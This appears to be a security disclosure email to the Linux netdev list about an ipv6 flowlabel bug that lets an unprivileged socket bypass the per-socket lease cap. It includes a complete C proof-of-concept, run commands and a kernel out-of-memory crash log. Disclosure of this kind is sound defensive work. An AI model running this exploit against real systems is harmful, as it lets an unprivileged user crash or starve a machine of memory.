Received: from mail-pj1-f54.google.com (mail-pj1-f54.google.com [209.85.216.54])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7802933F5BF
	for <netdev@vger.kernel.org>; Mon,  3 Aug 2026 11:22:22 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.54
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785756144; cv=none; b=qVABg890N0HzOdrj2R3VAOyA5dsYRX6YG1/q/oNLLPOw/XZBGNQ8MtGZF/WOTayQWCRQ82BUiaTISFW4aiOSXTsUiml8JbkvQ11KmNXihO6gkJy4Vsz1rqd8H+RFTXZDmmNvH1CuHeLgFExEJxtp0s5SH9monCdBdlPn7YBEoNY=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785756144; c=relaxed/simple;
	bh=iOJ4CRw+GvTXy14shi2YEEiGgLM81LQQ3b8CprXXEBU=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=UGb7gD9+NNFCmQ3K+hq+Nk2I+P2bB+vxmgoVYw09Og4UiV+RGALEMaUQioNB1A8OIIpHFOQIxAtKQa/OVLsQVxfINUTORCnqxGf7le/COMIZyj4R2JdgiTNC89u2WGglzEncp4cJ3SKM7SxlKlXiwW5CYbA12W61UlZDrZesZR4=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=bPmgVLmq; arc=none smtp.client-ip=209.85.216.54
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="bPmgVLmq"
Received: by mail-pj1-f54.google.com with SMTP id 98e67ed59e1d1-38dc69c74b8so2968359a91.0
        for <netdev@vger.kernel.org>; Mon, 03 Aug 2026 04:22:22 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785756142; x=1786360942; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=uNjmTrAWAeroEIxRj8CKBzQYQkicdV3KehYayAdFJ1A=;
        b=bPmgVLmqnKXlbdKTd4x2GrEzW+dzjbxXtROONoFxzHH7fi1feivPbVW+JHhRh8mQF2
         wDwAs66iolZOtUG68wBsMADSJZ4GYLxokL0rZ3aR8RJD1EMUVGoWiLXVqjAtD3riLLeB
         aXJuo9REgTsLgVT4mJsFJvJr7gA3+1XLSuT376AtFaxLJTlCYFLsc+lXcfxAbx58vogM
         v1yxyiETfgaHVxEbjG+Gd9937h/ce9xYRAhCcfh/RlUGB/Oob6hf3Ul67EfMMQOLgAh8
         JlmyP4kEewJEFxOz4PwcXi+HRXhPdzM0iyHf78K1nlocMxx8IQqXRVyQyFJNxBae9qMg
         7rzA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785756142; x=1786360942;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=uNjmTrAWAeroEIxRj8CKBzQYQkicdV3KehYayAdFJ1A=;
        b=gHcBvpf2V1AvepcAVYKWgvnMaOIFfc6TUMUTpCZW9hQoc6NkYFxLobAjHyb++io2CK
         PoNJ6B94/T+uNxOCqmj/EvszA/ZmIJnNywWL7eazYKzItw8aP/h7BBsolBqBA2CgvUWZ
         wXjaNrzBdzd8BC4Bvl0B24LmEoK8MHMR23alhGRsiypSXeEFpjjc5Re5/nhTXX88NqMC
         5gtcDZHTnu08WLgBHhFIiS3BwD05dYBeU3eO71LaU0wu3hshoRvNN1A1Zzq2onGbVTJB
         qPyDDDgi/jie/iYO00YyjmmWtlSY3auKgmtAzyfMhVp7KHDlJQ9/GUhyrqmQ8Kzx5+nF
         z4Dw==
X-Gm-Message-State: AOJu0YynpJnN5VyGKCPTN6VxvR9jq35YRFhDqyQj4xFwij9G2qRxqrXv
	+9LZ5lOSRVs4wM2jOGoiM3T83Not8fq5xLT+fwbAAR6b+ozHhywtVXRb7XPh1ZPvM6XM2AX6NpJ
	wNp8soUue7ceT/A==
X-Gm-Gg: AR+sD13weYaC2SFAyy35zgij90S0d4K+4Xn1WgO5apJ7CH2c5epJVwr7nzpxb5DGOph
	SLoRZxL9xohMi5p2v3p7f5sW/KADaodBhtOFLhz9yvqQzhYra4g4n3xgzkPSMvV6tR9Z2MLn/hl
	QmB2YzzOnnib2NDaYYI4av7jgWGBDX1LLPDvFKpMaakZEXrhdIxz08AwH/Frqe0hx8vl5tXocyx
	A7dbJ3Ouvi84bb2gT9i+p/9EGDHz+lhXZp0ubGC2HJJIFW6a+een2hG/dnYYPFnrm+WuJdmoZRQ
	0ZnoMTnSH5M8Unfyo3idiCIcoaiF3mXmeObeLbXVrE8feIXCKIN5B/S2LjY52GL8lWaE7F6uLZU
	w5XIWIMAOza//6edZ0ElEvv8R++Ud/ZDgTyzWnnbc3hdq/eWniBQDSsWdZR1fT2f6VKhJBLXEqx
	gZYGrthByGssyKJiZXxmlKpnLAJquxKvuY4Z9Am4pzWWpAa6ObbJYUVCEQl2v1tHzzlrm9WlpVI
	W5eMgL9qh3J4qQ=
X-Received: by 2002:a17:90b:5648:b0:38e:76f8:fcbf with SMTP id 98e67ed59e1d1-38fbc55256bmr8151167a91.31.1785756141401;
        Mon, 03 Aug 2026 04:22:21 -0700 (PDT)
Received: from Roxy.localdomain ([203.175.14.32])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-38fb2964c10sm3788309a91.4.2026.08.03.04.22.17
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 03 Aug 2026 04:22:20 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: netdev@vger.kernel.org
Cc: dsahern@kernel.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net 0/1] ipv6: flowlabel: enforce the per-socket lease cap on reused labels
Date: Mon,  3 Aug 2026 19:22:03 +0800
Message-ID: <cover.1785746178.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable

Hi Linux kernel maintainers,=0D
=0D
We found and validated a issue in net/ipv6/ip6_flowlabel.c. The bug is=0D
reachable by a non-root user without namespace setup.=0D
We've tested it, and it should not affect any other functionality.=0D
=0D
We will provide detailed information about the bug=0D
in this email, along with a PoC to trigger it.=0D
=0D
---- details below ----=0D
=0D
Bug details:=0D
=0D
ipv6_flowlabel_get() lets a socket reacquire a compatible existing=0D
flowlabel and link another ipv6_fl_socklist entry through the recheck=0D
path.=0D
=0D
The normal create path goes through mem_check(). That logic relies on=0D
fl_size growing as new labels are created, so the FL_MAX_PER_SOCK cap=0D
becomes effective once one socket has already leased 32 labels.=0D
=0D
Reusing an existing flowlabel does not increase fl_size. Repeated GET=0D
requests for the same label on one socket therefore keep succeeding=0D
through recheck without ever tripping the per-socket cap, which allows=0D
one unprivileged socket to grow ipv6_fl_list and fl->users without=0D
bound.=0D
=0D
The fix is to count the current socket leases before linking a reused=0D
flowlabel. This preserves the existing global budget logic for new=0D
labels and only closes the duplicate-acquisition bypass.=0D
=0D
Reproducer:=0D
=0D
    gcc -O2 -Wall -Wextra -pthread -o poc poc.c=0D
    echo 2 > /proc/sys/vm/panic_on_oom=0D
    ./poc 4=0D
=0D
We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.=0D
=0D
------BEGIN poc.c------=0D
=0D
#define _GNU_SOURCE=0D
=0D
#include <arpa/inet.h>=0D
#include <errno.h>=0D
#include <linux/in6.h>=0D
#include <netinet/in.h>=0D
#include <pthread.h>=0D
#include <signal.h>=0D
#include <stdint.h>=0D
#include <stdio.h>=0D
#include <stdlib.h>=0D
#include <string.h>=0D
#include <sys/socket.h>=0D
#include <sys/types.h>=0D
#include <unistd.h>=0D
=0D
#ifndef IPV6_FLOWLABEL_MGR=0D
#define IPV6_FLOWLABEL_MGR 32=0D
#endif=0D
=0D
struct worker_args {=0D
	int id;=0D
	unsigned long long limit;=0D
};=0D
=0D
static void die(const char *what)=0D
{=0D
	perror(what);=0D
	exit(EXIT_FAILURE);=0D
}=0D
=0D
static int flowlabel_get(int fd, struct in6_flowlabel_req *req)=0D
{=0D
	return setsockopt(fd, IPPROTO_IPV6, IPV6_FLOWLABEL_MGR, req, sizeof(*req))=
;=0D
}=0D
=0D
static void init_req(struct in6_flowlabel_req *req)=0D
{=0D
	memset(req, 0, sizeof(*req));=0D
	req->flr_dst =3D in6addr_loopback;=0D
	req->flr_action =3D IPV6_FL_A_GET;=0D
	req->flr_share =3D IPV6_FL_S_ANY;=0D
	req->flr_flags =3D IPV6_FL_F_CREATE;=0D
	req->flr_expires =3D 6;=0D
	req->flr_linger =3D 6;=0D
}=0D
=0D
static void *worker(void *opaque)=0D
{=0D
	struct worker_args *args =3D opaque;=0D
	struct in6_flowlabel_req req;=0D
	unsigned long long i =3D 0;=0D
	int fd;=0D
=0D
	fd =3D socket(AF_INET6, SOCK_DGRAM, 0);=0D
	if (fd < 0)=0D
		die("socket");=0D
=0D
	init_req(&req);=0D
	if (flowlabel_get(fd, &req) < 0)=0D
		die("initial flowlabel get");=0D
=0D
	fprintf(stderr, "thread=3D%d label=3D0x%05x\n", args->id,=0D
		(unsigned int)(ntohl(req.flr_label) & 0xfffff));=0D
=0D
	req.flr_flags =3D 0;=0D
	for (;;) {=0D
		if (flowlabel_get(fd, &req) < 0)=0D
			die("duplicate flowlabel get");=0D
=0D
		i++;=0D
		if ((i & ((1ULL << 20) - 1)) =3D=3D 0)=0D
			fprintf(stderr, "thread=3D%d duplicates=3D%llu\n", args->id, i);=0D
		if (args->limit && i >=3D args->limit)=0D
			break;=0D
	}=0D
=0D
	pause();=0D
	return NULL;=0D
}=0D
=0D
int main(int argc, char **argv)=0D
{=0D
	struct worker_args *args;=0D
	pthread_t *threads;=0D
	unsigned long long limit =3D 0;=0D
	int i;=0D
	int nr_threads =3D 1;=0D
=0D
	if (argc > 1)=0D
		nr_threads =3D atoi(argv[1]);=0D
	if (argc > 2)=0D
		limit =3D strtoull(argv[2], NULL, 0);=0D
=0D
	if (nr_threads <=3D 0 || nr_threads > 256) {=0D
		fprintf(stderr, "usage: %s [threads 1-256] [duplicate_limit]\n", argv[0])=
;=0D
		return EXIT_FAILURE;=0D
	}=0D
=0D
	signal(SIGPIPE, SIG_IGN);=0D
=0D
	threads =3D calloc(nr_threads, sizeof(*threads));=0D
	args =3D calloc(nr_threads, sizeof(*args));=0D
	if (!threads || !args)=0D
		die("calloc");=0D
=0D
	for (i =3D 0; i < nr_threads; i++) {=0D
		args[i].id =3D i;=0D
		args[i].limit =3D limit;=0D
		if (pthread_create(&threads[i], NULL, worker, &args[i]) !=3D 0) {=0D
			errno =3D errno ? errno : EINVAL;=0D
			die("pthread_create");=0D
		}=0D
	}=0D
=0D
	for (i =3D 0; i < nr_threads; i++) {=0D
		if (pthread_join(threads[i], NULL) !=3D 0) {=0D
			errno =3D errno ? errno : EINVAL;=0D
			die("pthread_join");=0D
		}=0D
	}=0D
=0D
	return 0;=0D
}=0D
=0D
------END poc.c--------=0D
=0D
----BEGIN crash log----=0D
=0D
[  260.114163][ T9280] poc invoked oom-killer: gfp_mask=3D0x40cc0(GFP_KERNE=
L|__GFP_COMP), order=3D0, oom_score_adj=3D0=0D
[  260.116323][ T9280] CPU: 1 UID: 1001 PID: 9280 Comm: poc Not tainted 7.1=
.0-rc2-g6f381f63ccfe-dirty #3 PREEMPT(full)=0D
[  260.116333][ T9280] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PII=
X, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014=0D
[  260.116338][ T9280] Call Trace:=0D
[  260.116342][ T9280]  <TASK>=0D
[  260.116344][ T9280]  dump_stack_lvl+0x164/0x1f0=0D
[  260.116430][ T9280]  dump_header+0xf9/0x980=0D
[  260.116440][ T9280]  out_of_memory+0x896/0x1680=0D
[  260.116446][ T9280]  ? __pfx_out_of_memory+0x10/0x10=0D
[  260.116453][ T9280]  __alloc_frozen_pages_noprof+0x2309/0x2b00=0D
[  260.116463][ T9280]  ? __pfx___alloc_frozen_pages_noprof+0x10/0x10=0D
[  260.116470][ T9280]  ? __lock_acquire+0x45c/0x25f0=0D
[  260.116491][ T9280]  ? __sanitizer_cov_trace_switch+0x54/0x90=0D
[  260.116498][ T9280]  ? policy_nodemask+0xed/0x4f0=0D
[  260.116506][ T9280]  alloc_pages_mpol+0x1fb/0x540=0D
[  260.116512][ T9280]  ? __pfx_alloc_pages_mpol+0x10/0x10=0D
[  260.116518][ T9280]  ? __lock_acquire+0x45c/0x25f0=0D
[  260.116523][ T9280]  ? unwind_get_return_address+0x59/0xa0=0D
[  260.116532][ T9280]  new_slab+0x458/0x670=0D
[  260.116537][ T9280]  ? find_held_lock+0x2b/0x80=0D
[  260.116542][ T9280]  ___slab_alloc+0x2c4/0x7f0=0D
[  260.116546][ T9280]  ? fl_create+0x104/0xd30=0D
[  260.116554][ T9280]  ? __pcs_replace_empty_main+0x3e3/0x640=0D
[  260.116561][ T9280]  __kmalloc_cache_noprof+0x389/0x6e0=0D
[  260.116566][ T9280]  ? fl_create+0x104/0xd30=0D
[  260.116572][ T9280]  fl_create+0x104/0xd30=0D
[  260.116578][ T9280]  ? do_sock_setsockopt+0xf3/0x1d0=0D
[  260.116585][ T9280]  ? __sys_setsockopt+0x19a/0x230=0D
[  260.116589][ T9280]  ? __x64_sys_setsockopt+0xbd/0x160=0D
[  260.116594][ T9280]  ? do_syscall_64+0x116/0xf80=0D
[  260.116600][ T9280]  ? entry_SYSCALL_64_after_hwframe+0x77/0x7f=0D
[  260.116606][ T9280]  ? __pfx_fl_create+0x10/0x10=0D
[  260.116613][ T9280]  ? __lock_acquire+0x45c/0x25f0=0D
[  260.116622][ T9280]  ? find_held_lock+0x2b/0x80=0D
[  260.116626][ T9280]  ? __might_fault+0xbc/0x130=0D
[  260.116633][ T9280]  ? __might_fault+0xbc/0x130=0D
[  260.116638][ T9280]  ipv6_flowlabel_opt+0x50f/0x2d70=0D
[  260.116646][ T9280]  ? __pfx_ipv6_flowlabel_opt+0x10/0x10=0D
[  260.116652][ T9280]  ? __pfx_do_raw_spin_lock+0x10/0x10=0D
[  260.116659][ T9280]  ? __local_bh_enable_ip+0xa2/0x120=0D
[  260.116667][ T9280]  ? do_ipv6_setsockopt+0x1b4a/0x4640=0D
[  260.116673][ T9280]  do_ipv6_setsockopt+0x1b4a/0x4640=0D
[  260.116680][ T9280]  ? __print_lock_name+0x40/0xe0=0D
[  260.116684][ T9280]  ? __pfx_do_ipv6_setsockopt+0x10/0x10=0D
[  260.116689][ T9280]  ? avc_has_perm_noaudit+0x11e/0x3b0=0D
[  260.116716][ T9280]  ? avc_has_perm_noaudit+0x145/0x3b0=0D
[  260.116722][ T9280]  ? avc_has_perm+0x141/0x1f0=0D
[  260.116728][ T9280]  ? __pfx_avc_has_perm+0x10/0x10=0D
[  260.116734][ T9280]  ? find_held_lock+0x2b/0x80=0D
[  260.116738][ T9280]  ? finish_task_switch.isra.0+0x2c3/0x1080=0D
[  260.116747][ T9280]  ? sock_has_perm+0x25a/0x2f0=0D
[  260.116753][ T9280]  ? __pfx_sock_has_perm+0x10/0x10=0D
[  260.116757][ T9280]  ? selinux_netlbl_socket_setsockopt+0x183/0x470=0D
[  260.116764][ T9280]  ? __pfx_selinux_netlbl_socket_setsockopt+0x10/0x10=
=0D
[  260.116771][ T9280]  ? ipv6_setsockopt+0xcb/0x170=0D
[  260.116776][ T9280]  ipv6_setsockopt+0xcb/0x170=0D
[  260.116782][ T9280]  udpv6_setsockopt+0x64/0xb0=0D
[  260.116787][ T9280]  ? __pfx_sock_common_setsockopt+0x10/0x10=0D
[  260.116794][ T9280]  do_sock_setsockopt+0xf3/0x1d0=0D
[  260.116801][ T9280]  __sys_setsockopt+0x19a/0x230=0D
[  260.116808][ T9280]  __x64_sys_setsockopt+0xbd/0x160=0D
[  260.116813][ T9280]  ? do_syscall_64+0x90/0xf80=0D
[  260.116818][ T9280]  ? lockdep_hardirqs_on+0x7b/0x110=0D
[  260.116823][ T9280]  do_syscall_64+0x116/0xf80=0D
[  260.116829][ T9280]  ? clear_bhb_loop+0x40/0x90=0D
[  260.116835][ T9280]  entry_SYSCALL_64_after_hwframe+0x77/0x7f=0D
[  260.116841][ T9280] RIP: 0033:0x4218ce=0D
[  260.116847][ T9280] Code: bc c5 c1 e0 1a 0d 00 00 04 00 89 01 e9 c1 fe f=
f ff e8 76 01 00 00 66 0f 1f 44 00 00 f3 0f 1e fa 49 89 ca b8 36 00 00 00 0=
f 05 <48> 3d 00 f0 ff ff 77 0a c3 66 0f 1f 84 00 00 00 00 00 48 c7 c2 b8=0D
[  260.116875][ T9280] RSP: 002b:00007fb2b56d01e8 EFLAGS: 00000286 ORIG_RAX=
: 0000000000000036=0D
[  260.116887][ T9280] RAX: ffffffffffffffda RBX: 00000000000e4359 RCX: 000=
00000004218ce=0D
[  260.116890][ T9280] RDX: 0000000000000020 RSI: 0000000000000029 RDI: 000=
0000000000006=0D
[  260.116893][ T9280] RBP: 000000000968d9a0 R08: 0000000000000020 R09: 000=
0000000000000=0D
[  260.116896][ T9280] R10: 00007fb2b56d01f0 R11: 0000000000000286 R12: 000=
0000000000006=0D
[  260.116899][ T9280] R13: 00007fb2b56d01f0 R14: 0000000000499075 R15: 000=
07fff06d5a7d0=0D
[  260.116905][ T9280]  </TASK>=0D
[  260.116907][ T9280] Mem-Info:=0D
[  260.293627][ T9280] active_anon:4299 inactive_anon:4857 isolated_anon:21=
9=0D
[  260.293627][ T9280]  active_file:137 inactive_file:432 isolated_file:0=0D
[  260.293627][ T9280]  unevictable:1757 dirty:0 writeback:0=0D
[  260.293627][ T9280]  slab_reclaimable:5632 slab_unreclaimable:238045=0D
[  260.293627][ T9280]  mapped:69 shmem:2715 pagetables:560=0D
[  260.293627][ T9280]  sec_pagetables:0 bounce:0=0D
[  260.293627][ T9280]  kernel_misc_reclaimable:0=0D
[  260.293627][ T9280]  free:14850 free_pcp:158 free_cma:0=0D
[  260.310299][ T9280] Node 0 active_anon:17280kB inactive_anon:19428kB act=
ive_file:968kB inactive_file:1728kB unevictable:7028kB isolated(anon):624kB=
 isolated(file):0kB mapped:360kB dirty:0kB writeback:0kB shmem:10860kB shme=
m_thp:0kB shmem_pmdmapped:0kB anon_thp:0kB kernel_stack:9312kB pagetables:2=
240kB sec_pagetables:0kB all_unreclaimable? yes Balloon:0kB gpu_active:0kB =
gpu_reclaim:0kB=0D
[  260.337132][ T9280] Node 0 DMA free:5704kB boost:0kB min:532kB low:664kB=
 high:796kB reserved_highatomic:0KB free_highatomic:0KB active_anon:0kB ina=
ctive_anon:0kB active_file:0kB inactive_file:244kB unevictable:0kB writepen=
ding:0kB zspages:0kB present:15992kB managed:15360kB mlocked:0kB bounce:0kB=
 free_pcp:0kB local_pcp:0kB free_cma:0kB=0D
[  260.366962][ T9280] lowmem_reserve[]: 0 1275 1275 1275 1275=0D
[  260.367819][ T9280] Node 0 DMA32 free:52848kB boost:8192kB min:52712kB l=
ow:63840kB high:74968kB reserved_highatomic:0KB free_highatomic:0KB active_=
anon:18036kB inactive_anon:19260kB active_file:2480kB inactive_file:1048kB =
unevictable:7028kB writepending:0kB zspages:0kB present:2080640kB managed:1=
305728kB mlocked:0kB bounce:0kB free_pcp:592kB local_pcp:428kB free_cma:0kB=
=0D
[  260.394848][ T9280] lowmem_reserve[]: 0 0 0 0 0=0D
[  260.395449][ T9280] Node 0 DMA: 1*4kB (U) 6*8kB (U) 5*16kB (U) 4*32kB (U=
M) 2*64kB (UM) 1*128kB (M) 0*256kB 2*512kB (UM) 2*1024kB (UM) 1*2048kB (U) =
0*4096kB =3D 5636kB=0D
[  260.402961][ T9280] Node 0 DMA32: 415*4kB (ME) 288*8kB (ME) 187*16kB (ME=
) 138*32kB (UME) 73*64kB (UME) 58*128kB (UME) 22*256kB (UME) 14*512kB (UME)=
 2*1024kB (M) 3*2048kB (M) 2*4096kB (M) =3D 52652kB=0D
[  260.411359][ T9280] Node 0 hugepages_total=3D0 hugepages_free=3D0 hugepa=
ges_surp=3D0 hugepages_size=3D1048576kB=0D
[  260.412684][ T9280] Node 0 hugepages_total=3D4 hugepages_free=3D4 hugepa=
ges_surp=3D0 hugepages_size=3D2048kB=0D
[  260.422944][ T9280] 3181 total pagecache pages=0D
[  260.423573][ T9280] 0 pages in swap cache=0D
[  260.424132][ T9280] Free swap  =3D 0kB=0D
[  260.429228][ T9280] Total swap =3D 0kB=0D
[  260.429831][ T9280] 524158 pages RAM=0D
[  260.430270][ T9280] 0 pages HighMem/MovableOnly=0D
[  260.435421][ T9280] 193886 pages reserved=0D
[  260.436369][ T9280] 0 pages cma reserved=0D
[  260.447576][ T9280] Unreclaimable slab info:=0D
[  260.448598][ T9280] Name                      Used          Total=0D
[  260.460632][ T9280] bio-464                    1KB         15KB=0D
[  260.481536][ T9280] bio-528                    3KB         15KB=0D
[  260.495366][ T9280] bio-544                    1KB         15KB=0D
[  260.496240][ T9280] bio-552                    1KB         15KB=0D
[  260.512532][ T9280] TIPC                       1KB         31KB=0D
[  260.524576][ T9280] SCTPv6                     2KB         30KB=0D
[  260.525433][ T9280] RXRPC                      2KB         30KB=0D
[  260.534107][ T9280] rxrpc_call_jar            19KB         62KB=0D
[  260.553196][ T9280] fib6_node                  2KB          4KB=0D
[  260.554042][ T9280] ip6_dst_cache              1KB          7KB=0D
[  260.563372][ T9280] RAWv6                     17KB         30KB=0D
[  260.564924][ T9280] UDPv6                     11KB         61KB=0D
[  260.569716][ T9280] TCPv6                     10KB         31KB=0D
[  260.571016][ T9280] t10_alua_lu_gp_cache          0KB          7KB=0D
[  260.580186][ T9280] scsi_sense_cache           2KB          3KB=0D
[  260.586086][ T9280] virtio_scsi_cmd           24KB         31KB=0D
[  260.591434][ T9280] bio-136                   45KB         48KB=0D
[  260.592420][ T9280] bio-264                    1KB          7KB=0D
[  260.596561][ T9280] mqueue_inode_cache          1KB         30KB=0D
[  260.604287][ T9280] f2fs_bio_post_read_ctx         28KB         31KB=0D
[  260.609999][ T9280] jfs_mp                     9KB         11KB=0D
[  260.611025][ T9280] cifs_small_rq             18KB         22KB=0D
[  260.616364][ T9280] cifs_request              67KB         67KB=0D
[  260.621772][ T9280] cifs_mpx_ids               1KB          7KB=0D
[  260.629231][ T9280] cifs_io_subrequest         50KB         56KB=0D
[  260.630268][ T9280] cifs_io_request          100KB        112KB=0D
[  260.636659][ T9280] nfs_commit_data            3KB         15KB=0D
[  260.653306][ T9280] nfs_write_data            38KB         46KB=0D
[  260.654362][ T9280] jbd2_inode                 2KB          3KB=0D
[  260.673085][ T9280] ext4_system_zone           1KB         11KB=0D
[  260.674510][ T9280] ext4_io_end_vec            0KB          3KB=0D
[  260.680643][ T9280] fasync_cache               0KB          3KB=0D
[  260.686736][ T9280] kvm_gmem_inode_cache          1KB         15KB=0D
[  260.691120][ T9280] rpc_buffers               18KB         31KB=0D
[  260.698807][ T9280] rpc_tasks                  3KB          7KB=0D
[  260.704566][ T9280] UNIX-STREAM               42KB        220KB=0D
[  260.705567][ T9280] UNIX                      36KB         94KB=0D
[  260.712137][ T9280] tcp_bind2_bucket           1KB          4KB=0D
[  260.715661][ T9280] tcp_bind_bucket            0KB          4KB=0D
[  260.724068][ T9280] ip_fib_trie                1KB          3KB=0D
[  260.725260][ T9280] ip_fib_alias               1KB          3KB=0D
[  260.732443][ T9280] rtable                     1KB         31KB=0D
[  260.739579][ T9280] RAW                       12KB         32KB=0D
[  260.744301][ T9280] UDP                        4KB         31KB=0D
[  260.749433][ T9280] request_sock_TCP           0KB          7KB=0D
[  260.757352][ T9280] TCP                       10KB         60KB=0D
[  260.760139][ T9280] fs_bio_integrity           0KB          4KB=0D
[  260.767195][ T9280] hugetlbfs_inode_cache          3KB         15KB=0D
[  260.768482][ T9280] netfs_subrequest          37KB         39KB=0D
[  260.780312][ T9280] netfs_request            100KB        112KB=0D
[  260.789775][ T9280] bio-280                   16KB         16KB=0D
[  260.790819][ T9280] ep_head                    5KB         16KB=0D
[  260.798972][ T9280] eventpoll_pwq              9KB         27KB=0D
[  260.810600][ T9280] eventpoll_epi             16KB         45KB=0D
[  260.818663][ T9280] inotify_inode_mark         27KB         31KB=0D
[  260.830302][ T9280] sgpool-128               148KB        153KB=0D
[  260.831411][ T9280] sgpool-64                 81KB         94KB=0D
[  260.842260][ T9280] sgpool-32                 33KB         45KB=0D
[  260.846336][ T9280] sgpool-16                 17KB         47KB=0D
[  260.854460][ T9280] sgpool-8                  15KB         31KB=0D
[  260.855397][ T9280] bio_crypt_ctx             18KB         19KB=0D
[  260.862430][ T9280] bio_integrity_data          0KB          7KB=0D
[  260.870571][ T9280] request_queue            161KB        182KB=0D
[  260.871872][ T9280] blkdev_ioc                 0KB          7KB=0D
[  260.885183][ T9280] bio-200                   71KB         78KB=0D
[  260.898848][ T9280] biovec-max               328KB        367KB=0D
[  260.899757][ T9280] biovec-128                36KB         63KB=0D
[  260.910122][ T9280] biovec-64                 72KB         75KB=0D
[  260.921915][ T9280] biovec-16                 14KB         23KB=0D
[  260.928228][ T9280] uid_cache                  0KB          7KB=0D
[  260.934696][ T9280] dmaengine-unmap-256          2KB         31KB=0D
[  260.944161][ T9280] dmaengine-unmap-128          1KB         15KB=0D
[  260.952676][ T9280] dmaengine-unmap-16          0KB          7KB=0D
[  260.962559][ T9280] dmaengine-unmap-2          0KB          4KB=0D
[  260.969868][ T9280] QIPCRTR                    1KB         30KB=0D
[  260.979392][ T9280] audit_buffer               0KB          3KB=0D
[  260.987460][ T9280] skbuff_small_head         21KB         63KB=0D
[  260.995595][ T9280] skbuff_fclone_cache          0KB         63KB=0D
[  260.996848][ T9280] skbuff_head_cache         21KB         78KB=0D
[  261.006400][ T9280] configfs_dir_cache          4KB          7KB=0D
[  261.007444][ T9280] file_lock_cache            0KB         30KB=0D
[  261.016958][ T9280] file_lock_ctx             16KB         19KB=0D
[  261.025714][ T9280] fsnotify_inode_mark_connector         21KB         2=
2KB=0D
[  261.032200][ T9280] taskstats                  1KB         15KB=0D
[  261.040754][ T9280] mem_cgroup_per_node         59KB         91KB=0D
[  261.042018][ T9280] mem_cgroup                94KB        126KB=0D
[  261.052816][ T9280] proc_dir_entry           311KB        347KB=0D
[  261.056063][ T9280] seq_file                   0KB         15KB=0D
[  261.062996][ T9280] sigqueue                   0KB         11KB=0D
[  261.064059][ T9280] shmem_inode_cache       8424KB       8509KB=0D
[  261.073260][ T9280] kernfs_iattrs_cache        210KB        225KB=0D
[  261.074257][ T9280] kernfs_node_cache      21226KB      21321KB=0D
[  261.085409][ T9280] mnt_cache                 53KB         78KB=0D
[  261.097920][ T9280] filp                     253KB        850KB=0D
[  261.098743][ T9280] names_cache                0KB         31KB=0D
[  261.106620][ T9280] net_namespace              9KB         29KB=0D
[  261.107839][ T9280] ima_iint_cache            62KB        115KB=0D
[  261.118440][ T9280] hashtab_node             927KB        928KB=0D
[  261.128964][ T9280] ebitmap_node            2104KB       2126KB=0D
[  261.130061][ T9280] avtab_node             16916KB      16917KB=0D
[  261.139207][ T9280] avc_node                  89KB        134KB=0D
[  261.140175][ T9280] lsm_inode_cache         3781KB       4595KB=0D
[  261.147783][ T9280] lsm_file_cache            66KB        243KB=0D
[  261.148581][ T9280] key_jar                   24KB         32KB=0D
[  261.157045][ T9280] uts_namespace              0KB         15KB=0D
[  261.157875][ T9280] nsproxy                    0KB          3KB=0D
[  261.164685][ T9280] vm_area_struct          1085KB       2086KB=0D
[  261.165777][ T9280] fs_cache                   7KB         31KB=0D
[  261.174293][ T9280] files_cache               22KB         79KB=0D
[  261.175257][ T9280] signal_cache             526KB       1785KB=0D
[  261.186472][ T9280] sighand_cache            667KB       2037KB=0D
[  261.196071][ T9280] task_struct             2273KB       4406KB=0D
[  261.197362][ T9280] cred                     127KB        567KB=0D
[  261.206991][ T9280] anon_vma_chain           321KB        574KB=0D
[  261.208044][ T9280] anon_vma                 288KB        465KB=0D
[  261.213781][ T9280] pid                      126KB        441KB=0D
[  261.214599][ T9280] Acpi-Operand              76KB        158KB=0D
[  261.220338][ T9280] Acpi-ParseExt              0KB         15KB=0D
[  261.221073][ T9280] Acpi-Parse                 0KB         15KB=0D
[  261.225952][ T9280] Acpi-State                 0KB         15KB=0D
[  261.226936][ T9280] Acpi-Namespace            55KB         62KB=0D
[  261.235942][ T9280] numa_policy                0KB          3KB=0D
